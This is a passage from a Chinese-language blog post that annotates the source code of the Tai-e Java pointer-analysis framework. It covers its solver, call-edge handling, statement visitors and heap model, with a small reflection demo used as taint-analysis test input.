class="line">                    <span class="comment">// are covariant</span></span><br><span class="line">                    addPFGEdge(from, arrayIndex,</span><br><span class="line">                            FlowKind.ARRAY_STORE, arrayIndex.getType());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-780.png" alt="upload successful"></p></li><li><p>注意$r5原本的pts，是个newarray</p></li><li><p>$r5[%intconst0] = %classconst2</p></li></ul><p>那么同样还是store的逻辑</p><ul><li>from 是 %classconst2</li><li>target 是$r5[%intconst0]<blockquote><p>注：原课件中只有考虑InstanceField的情况，并没有考虑Array[i]元素，大同小异。<br>疑问：除了Array还有Map、Collection之类的基础结构，Array支持吗？</p></blockquote></li></ul><h4 id="processArrayLoad-CSVar-arrayVar-PointsToSet-pts"><a href="#processArrayLoad-CSVar-arrayVar-PointsToSet-pts" class="headerlink" title="processArrayLoad(CSVar arrayVar, PointsToSet pts)"></a>processArrayLoad(CSVar arrayVar, PointsToSet pts)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processArrayLoad</span><span class="params">(CSVar arrayVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> arrayVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> arrayVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (LoadArray load : <span class="keyword">var</span>.getLoadArrays()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">lvalue</span> <span class="operator">=</span> load.getLValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(lvalue)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, lvalue);</span><br><span class="line">            pts.forEach(array -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (array.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">ArrayIndex</span> <span class="variable">arrayIndex</span> <span class="operator">=</span> csManager.getArrayIndex(array);</span><br><span class="line">                    addPFGEdge(arrayIndex, to, FlowKind.ARRAY_LOAD);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-781.png" alt="upload successful"></p><p>同样的，对于r1 = r0[%intconst0]</p><ul><li>from 是r0[%intconst0]</li><li>target 是r1</li></ul><h4 id="processCall-CSVar-recv-PointsToSet-pts"><a href="#processCall-CSVar-recv-PointsToSet-pts" class="headerlink" title="processCall(CSVar recv, PointsToSet pts)"></a>processCall(CSVar recv, PointsToSet pts)</h4><p><img src="/images/pasted-782.png" alt="upload successful"></p><p>Call过程是最复杂的，以示例代码中的tt为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line"><span class="type">String</span> <span class="variable">methodNmae</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"><span class="type">InvokeDemo</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line"><span class="comment">// 1. 测试污点为参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 测试污点为method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> tt.getClass().getMethod(methodNmae);</span><br><span class="line">method2.invoke(tt);</span><br><span class="line">upload successful</span><br></pre></td></tr></table></figure><p>和它相关的有三个invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCall</span><span class="params">(CSVar recv, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> recv.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> recv.getVar();</span><br><span class="line">    <span class="keyword">for</span> (Invoke callSite : <span class="keyword">var</span>.getInvokes()) &#123;</span><br><span class="line">        pts.forEach(recvObj -&gt; &#123;</span><br><span class="line">            <span class="comment">// resolve callee</span></span><br><span class="line">            <span class="comment">// 获取method</span></span><br><span class="line">            <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> CallGraphs.resolveCallee(</span><br><span class="line">                    recvObj.getObject().getType(), callSite);</span><br><span class="line">            <span class="keyword">if</span> (callee != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// select context</span></span><br><span class="line">                <span class="comment">// 获取method上下文</span></span><br><span class="line">                <span class="comment">// 注意这里method上下文的获取方式，后续上下文敏感再详细跟踪</span></span><br><span class="line">                <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(context, callSite);</span><br><span class="line">                <span class="type">Context</span> <span class="variable">calleeContext</span> <span class="operator">=</span> contextSelector.selectContext(</span><br><span class="line">                        csCallSite, recvObj, callee);</span><br><span class="line">                <span class="comment">// build call edge</span></span><br><span class="line">                <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> csManager.getCSMethod(calleeContext, callee);</span><br><span class="line">                <span class="comment">// 增加一条CallEdge，放入WorkList</span></span><br><span class="line">                addCallEdge(<span class="keyword">new</span> <span class="title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(callSite),</span><br><span class="line">                        csCallSite, csCallee));</span><br><span class="line">                <span class="comment">// pass receiver object to *this* variable</span></span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">                <span class="keyword">if</span> (!isIgnored(callee)) &#123;</span><br><span class="line">                <span class="comment">// 这个逻辑还是比较简单的，没有想象中复杂</span></span><br><span class="line">                    <span class="comment">// 就是将method里面的this，指向调用者原本的pts</span></span><br><span class="line">                    addVarPointsTo(calleeContext, callee.getIR().getThis(),</span><br><span class="line">                            recvObj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                plugin.onUnresolvedCall(recvObj, context, callSite);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细看看isIgnored逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isIgnored</span><span class="params">(JMethod method)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ignoredMethods.contains(method) ||</span><br><span class="line">            onlyApp &amp;&amp; !method.isApplication();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-783.png" alt="upload successful"></p><ul><li>内置黑名单</li><li>如果配置了onlyApp参数，那么只分析app内部代码，不分析考虑jdk等代码</li></ul><p>如果不涉及native代码，onlyApp=false，那么可以分析出jdk内部的传播（CodeQL是不会去分析jdk代码的，因此需要自己完善jdk里面的污点传播关系）</p><ol><li>addCallEdge<br> <img src="/images/pasted-784.png" alt="upload successful"></li><li>addVarPointsTo<br> <img src="/images/pasted-785.png" alt="upload successful"></li></ol><blockquote><p>疑问：这些个workList pointerEntry 是哪里添加的？尤其这个invoke类型</p></blockquote><p>综合来讲，processCall只是添加了一个函数内部this-&gt;obj的workList.pointerEntry，更复杂的在processCallEdge。</p><h4 id="addCSMethod-CSMethod-csMethod"><a href="#addCSMethod-CSMethod-csMethod" class="headerlink" title="addCSMethod(CSMethod csMethod)"></a>addCSMethod(CSMethod csMethod)</h4><p>答案是在前文提到的addEntryPoint中，有一步是addCSMethod(csEntryMethod)，最终会执行stmtProcessor.process(csMethod, stmts);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCSMethod</span><span class="params">(CSMethod csMethod)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (callGraph.addReachableMethod(csMethod)) &#123;</span><br><span class="line">        <span class="comment">// process new reachable context-sensitive method</span></span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">method</span> <span class="operator">=</span> csMethod.getMethod();</span><br><span class="line">        <span class="keyword">if</span> (isIgnored(method)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        processNewMethod(method);</span><br><span class="line">        addStmts(csMethod, method.getIR().getStmts());</span><br><span class="line">        plugin.onNewCSMethod(csMethod);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStmts</span><span class="params">(CSMethod csMethod, Collection&lt;Stmt&gt; stmts)</span> &#123;</span><br><span class="line">    stmtProcessor.process(csMethod, stmts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细逻辑下面StmtProcess讲，堆栈如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addPointsTo:734, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addPointsTo:741, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addPointsTo:746, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addVarPointsTo:761, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:587, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:570, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:55, New (pascal.taie.ir.stmt)</span><br><span class="line">lambda$process$0:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:-1, DefaultSolver$StmtProcessor$$Lambda$324/0x0000000800ef54e0 (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">process:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addStmts:827, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addCSMethod:820, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addEntryPoint:787, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onStart:59, EntryPointHandler (pascal.taie.analysis.pta.plugin)</span><br></pre></td></tr></table></figure><h2 id="4-4-StmtProcess"><a href="#4-4-StmtProcess" class="headerlink" title="4.4 StmtProcess"></a>4.4 StmtProcess</h2><p>背景是addEntryPoint-&gt;addCSMethod，简单来讲addCSMethod中有一步就是解析所有的子IR，放入workList。</p><p>其中用到了StmtProcess$Vistor，它针对不同的stmt IR，有不同的Visit接口</p><ul><li>New</li><li>Copy</li><li>Cast</li><li>LoadField</li><li>StoreField</li><li>Invoke</li></ul><p><img src="/images/pasted-786.png" alt="upload successful"></p><p>注：这个PFG边的逻辑才是Tai-e中实现的，还有一种图示，是oi-&gt;oj的指向。</p><h2 id="4-1-Visitor-API"><a href="#4-1-Visitor-API" class="headerlink" title="4.1 Visitor API"></a>4.1 Visitor API</h2><h3 id="visit-New-stmt"><a href="#visit-New-stmt" class="headerlink" title="visit(New stmt)"></a>visit(New stmt)</h3><p>New 类型逻辑是简单的，添加workList pointerEntry</p><ul><li>var 为stmt的左值</li><li>obj 比较复杂，因为是new 了一个新的对象，因此需要根据该对象的类型，生成一个obj<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(New stmt)</span> &#123;</span><br><span class="line">    <span class="comment">// obtain context-sensitive heap object</span></span><br><span class="line">    <span class="type">NewExp</span> <span class="variable">rvalue</span> <span class="operator">=</span> stmt.getRValue();</span><br><span class="line">    <span class="comment">// 重点：从stmt生成Obj</span></span><br><span class="line">    <span class="comment">// 新生成的obj，也会被放在heapModel中</span></span><br><span class="line">    <span class="type">Obj</span> <span class="variable">obj</span> <span class="operator">=</span> heapModel.getObj(stmt);</span><br><span class="line">    <span class="type">Context</span> <span class="variable">heapContext</span> <span class="operator">=</span> contextSelector.selectHeapContext(csMethod, obj);</span><br><span class="line">    <span class="comment">// 添加workList</span></span><br><span class="line">    addVarPointsTo(context, stmt.getLValue(), heapContext, obj);</span><br><span class="line">    <span class="comment">// 如果右边的值是一个Array类型，会进一步处理Array相关</span></span><br><span class="line">    <span class="keyword">if</span> (rvalue <span class="keyword">instanceof</span> NewMultiArray) &#123;</span><br><span class="line">        processNewMultiArray(stmt, heapContext, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果是Finalize，再说</span></span><br><span class="line">    <span class="keyword">if</span> (hasOverriddenFinalize(rvalue)) &#123;</span><br><span class="line">        processFinalizer(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>根据stmt生成obj的具体逻辑如下（部分逻辑可以在options中配置）</li></ul><p>AbstractHeapModel</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Obj <span class="title function_">getObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> allocSite.getRValue().getType();</span><br><span class="line">    <span class="keyword">if</span> (isMergeStringObjects &amp;&amp; type.equals(string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isMergeStringBuilders &amp;&amp;</span><br><span class="line">            (type.equals(stringBuilder) || type.equals(stringBuffer))) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isMergeExceptionObjects &amp;&amp; typeSystem.isSubtype(throwable, type)) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> doGetObj(allocSite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AllocationSiteBasedModel</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Obj <span class="title function_">doGetObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getNewObj(allocSite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AbstractHeapModel</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> NewObj <span class="title function_">getNewObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> newObjs.computeIfAbsent(allocSite,</span><br><span class="line">            site -&gt; add(<span class="keyword">new</span> <span class="title class_">NewObj</span>(site)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Obj</span>&gt; T <span class="title function_">add</span><span class="params">(T obj)</span> &#123;</span><br><span class="line">    objs.add(obj);</span><br><span class="line">    obj.setIndex(counter++);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NewObj(New allocSite) &#123;</span><br><span class="line">    <span class="built_in">this</span>.allocSite = allocSite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo:<br>stmt: $r3 = new InvokeDemo</p><p><img src="/images/pasted-787.png" alt="upload successful"><br>注意：此处新生成的obj，已经被放置在heapModel中了</p><blockquote><p>TODO: 未深入跟踪Array的处理和Finalize的处理，有空再做</p></blockquote><h3 id="visit-Copy-stmt"><a href="#visit-Copy-stmt" class="headerlink" title="visit(Copy stmt)"></a>visit(Copy stmt)</h3><p><img src="/images/pasted-788.png" alt="upload successful"></p><p>copy最简单，只需要</p><p>增加一条PFG边（addPFGEdge 会间接调用addPointsTo）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(Copy stmt)</span> &#123;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">rvalue</span> <span class="operator">=</span> stmt.getRValue();</span><br><span class="line">    <span class="keyword">if</span> (propTypes.isAllowed(rvalue)) &#123;</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, rvalue);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getLValue());</span><br><span class="line">        addPFGEdge(from, to, FlowKind.LOCAL_ASSIGN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="visit-LoadField-stmt"><a href="#visit-LoadField-stmt" class="headerlink" title="visit(LoadField stmt)"></a>visit(LoadField stmt)</h3><p><img src="/images/pasted-789.png" alt="upload successful"></p><p>同样的，增加一条PFG边</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(LoadField stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic() &amp;&amp; propTypes.isAllowed(stmt.getRValue())) &#123;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> stmt.getFieldRef().resolve();</span><br><span class="line">        <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getLValue());</span><br><span class="line">        addPFGEdge(sfield, to, FlowKind.STATIC_LOAD);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="visit-StoreField-stmt"><a href="#visit-StoreField-stmt" class="headerlink" title="visit(StoreField stmt)"></a>visit(StoreField stmt)</h3><p><img src="/images/pasted-790.png" alt="upload successful"></p><p>同样的，增加一条PFG边</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(StoreField stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic() &amp;&amp; propTypes.isAllowed(stmt.getRValue())) &#123;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> stmt.getFieldRef().resolve();</span><br><span class="line">        <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getRValue());</span><br><span class="line">        addPFGEdge(from, sfield, FlowKind.STATIC_STORE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="visit-Invoke-stmt"><a href="#visit-Invoke-stmt" class="headerlink" title="visit(Invoke stmt)"></a>visit(Invoke stmt)</h3><p><img src="/images/pasted-791.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(Invoke stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic()) &#123;</span><br><span class="line">        processInvokeStatic(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInvokeStatic</span><span class="params">(Invoke callSite)</span> &#123;</span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> CallGraphs.resolveCallee(<span class="literal">null</span>, callSite);</span><br><span class="line">    <span class="keyword">if</span> (callee != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(context, callSite);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">calleeCtx</span> <span class="operator">=</span> contextSelector.selectContext(csCallSite, callee);</span><br><span class="line">        <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> csManager.getCSMethod(calleeCtx, callee);</span><br><span class="line">        <span class="comment">// 增加一条调用边，交由processCallEdge去处理</span></span><br><span class="line">        addCallEdge(<span class="keyword">new</span> <span class="title class_">Edge</span>&lt;&gt;(CallKind.STATIC, csCallSite, csCallee));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出乎意料的是，只处理了InvokeStatic 静态方法。<br>实际上addCSMethod 知识被当作Method的初始化处理，复杂的都是交由DefaultSolver#processxxx 去处理。调用属于最复杂的。</p><h2 id="4-5-DefaultSolver"><a href="#4-5-DefaultSolver" class="headerlink" title="4.5 DefaultSolver"></a>4.5 DefaultSolver</h2><p>和4.3相同，不过因为重要解释StmtProcessor的需要</p><h3 id="4-3-1-API"><a href="#4-3-1-API" class="headerlink" title="4.3.1 API"></a>4.3.1 API</h3><p>接原4.3.1</p><p>processCallEdge</p><p><img src="/images/pasted-792.png" alt="upload successful"></p><p>processCallEdge</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCallEdge</span><span class="params">(Edge&lt;CSCallSite, CSMethod&gt; edge)</span> &#123;</span><br><span class="line"><span class="comment">// callGraph 添加调用</span></span><br><span class="line">    <span class="keyword">if</span> (callGraph.addEdge(edge)) &#123;</span><br><span class="line">        <span class="comment">// process new call edge</span></span><br><span class="line">        <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> edge.getCallee();</span><br><span class="line">        <span class="comment">// addCSMethod 分析被调用的Method</span></span><br><span class="line">        addCSMethod(csCallee);</span><br><span class="line">        <span class="keyword">if</span> (edge.getKind() != CallKind.OTHER</span><br><span class="line">                &amp;&amp; !isIgnored(csCallee.getMethod())) &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">callerCtx</span> <span class="operator">=</span> edge.getCallSite().getContext();</span><br><span class="line">            <span class="type">Invoke</span> <span class="variable">callSite</span> <span class="operator">=</span> edge.getCallSite().getCallSite();</span><br><span class="line">            <span class="type">Context</span> <span class="variable">calleeCtx</span> <span class="operator">=</span> csCallee.getContext();</span><br><span class="line">            <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> csCallee.getMethod();</span><br><span class="line">            <span class="type">InvokeExp</span> <span class="variable">invokeExp</span> <span class="operator">=</span> callSite.getInvokeExp();</span><br><span class="line">            <span class="comment">// pass arguments to parameters</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; invokeExp.getArgCount(); ++i) &#123;</span><br><span class="line">                <span class="type">Var</span> <span class="variable">arg</span> <span class="operator">=</span> invokeExp.getArg(i);</span><br><span class="line">                <span class="keyword">if</span> (propTypes.isAllowed(arg)) &#123;</span><br><span class="line">                    <span class="type">Var</span> <span class="variable">param</span> <span class="operator">=</span> callee.getIR().getParam(i);</span><br><span class="line">                    <span class="type">CSVar</span> <span class="variable">argVar</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, 